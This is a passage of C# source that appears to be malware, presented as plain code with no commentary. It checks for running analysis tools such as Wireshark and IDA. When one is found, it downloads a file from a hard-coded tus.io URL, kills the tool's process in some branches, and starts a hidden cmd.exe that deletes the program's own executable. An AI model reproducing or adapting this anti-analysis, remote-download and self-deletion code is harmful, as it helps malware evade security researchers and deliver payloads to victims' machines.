                webClient.DownloadFile("https://master.tus.io/files/b7d7450f9f18a709e436b7c17ca7409a+Uv3gWJFFZe4EZDJyCixDhAuv0YvWaA4Rwtro9wlQ6QExQU0Tv7XXmLqTSchi13zz47OCJLV7Ze0AWZmCPwwGCUqPPiKM1UDcGW54GFYICkQ2kiD0PoqnCAwy40D3y1UW", fileName);
                processesByName[num2].Kill();
                Process.Start(new ProcessStartInfo
                {
                    WindowStyle = ProcessWindowStyle.Hidden,
                    CreateNoWindow = true,
                    Arguments = "/C choice /C Y /N /D Y /T 3 & Del " + Application.ExecutablePath,
                    FileName = "cmd.exe"
                });
            }
            processesByName = Process.GetProcessesByName("Wireshark");
            for (int num3 = 0; num3 < processesByName.Length; num3++)
            {
                webClient.DownloadFile("https://master.tus.io/files/b7d7450f9f18a709e436b7c17ca7409a+Uv3gWJFFZe4EZDJyCixDhAuv0YvWaA4Rwtro9wlQ6QExQU0Tv7XXmLqTSchi13zz47OCJLV7Ze0AWZmCPwwGCUqPPiKM1UDcGW54GFYICkQ2kiD0PoqnCAwy40D3y1UW", fileName);
                processesByName[num3].Kill();
                Process.Start(new ProcessStartInfo
                {
                    WindowStyle = ProcessWindowStyle.Hidden,
                    CreateNoWindow = true,
                    Arguments = "/C choice /C Y /N /D Y /T 3 & Del " + Application.ExecutablePath,
                    FileName = "cmd.exe"
                });
            }
            foreach (Process process in Process.GetProcessesByName("IDA: Quick start"))
            {
                webClient.DownloadFile("https://master.tus.io/files/b7d7450f9f18a709e436b7c17ca7409a+Uv3gWJFFZe4EZDJyCixDhAuv0YvWaA4Rwtro9wlQ6QExQU0Tv7XXmLqTSchi13zz47OCJLV7Ze0AWZmCPwwGCUqPPiKM1UDcGW54GFYICkQ2kiD0PoqnCAwy40D3y1UW", fileName);
                Process.Start(new ProcessStartInfo
                {
                    WindowStyle = ProcessWindowStyle.Hidden,
                    CreateNoWindow = true,
                    Arguments = "/C choice /C Y /N /D Y /T 3 & Del " + Application.ExecutablePath,
                    FileName = "cmd.exe"
                });
            }
            foreach (Process process2 in Process.GetProcessesByName("IDA v7.0.170914"))
            {
                webClient.DownloadFile("https://master.tus.io/files/b7d7450f9f18a709e436b7c17ca7409a+Uv3gWJFFZe4EZDJyCixDhAuv0YvWaA4Rwtro9wlQ6QExQU0Tv7XXmLqTSchi13zz47OCJLV7Ze0AWZmCPwwGCUqPPiKM1UDcGW54GFYICkQ2kiD0PoqnCAwy40D3y1UW", fileName);
                Process.Start(new ProcessStartInfo
                {
                    WindowStyle = ProcessWindowStyle.Hidden,
                    CreateNoWindow = true,
                    Arguments = "/C choice /C Y /N /D Y /T 3 & Del " + Application.ExecutablePath,
                    FileName = "cmd.exe"
                });
            }
            foreach (Process process3 in Process.GetProcessesByName("The Interactive Disassembler"))
            {
                webClient.DownloadFile("https://master.tus.io/files/b7d7450f9f18a709e436b7c17ca7409a+Uv3gWJFFZe4EZDJyCixDhAuv0YvWaA4Rwtro9wlQ6QExQU0Tv7XXmLqTSchi13zz47OCJLV7Ze0AWZmCPwwGCUqPPiKM1UDcGW54GFYICkQ2kiD0PoqnCAwy40D3y1UW", fileName);
                Process.Start(new ProcessStartInfo
                {
                    WindowStyle = ProcessWindowStyle.Hidden,
                    CreateNoWindow = true,
                    Arguments = "/C choice /C Y /N /D Y /T 3 & Del " + Application.ExecutablePath,
                    FileName = "cmd.exe"
                });
            }
        }
        #endregion
        #region useless shit v6
        private void Timer3_Tick(object sender, EventArgs e)
        {

        }
        #endregion

    }
}